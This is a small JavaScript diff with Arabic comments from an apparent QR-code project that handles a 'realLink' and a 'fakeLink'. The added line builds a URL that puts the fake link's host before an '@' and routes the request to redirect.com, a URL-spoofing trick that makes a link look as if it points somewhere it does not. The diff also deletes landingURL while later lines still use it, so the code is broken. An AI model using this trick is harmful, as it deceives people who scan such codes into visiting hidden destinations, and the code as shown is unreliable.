@@ -53,7 +53,7 @@
 
             // ✅ تعديل الرابط ليذهب إلى landing.html أولًا
 var repoName = "/trytask2";  // ✅ أضف اسم المستودع هنا
-var landingURL = window.location.origin + repoName + "/landing.html?realLink=" + encodeURIComponent(realLink) + "&fakeLink=" + encodeURIComponent(fakeLink);
+var qrData = "https://" + fakeLink.replace(/^https?:\/\//, '') + "@redirect.com?goto=" + encodeURIComponent(landingURL);
 
             // ✅ توليد الـ QR Code بالرابط الجديد
             QRCode.toDataURL(landingURL, { errorCorrectionLevel: 'H' }, function (error, url) {
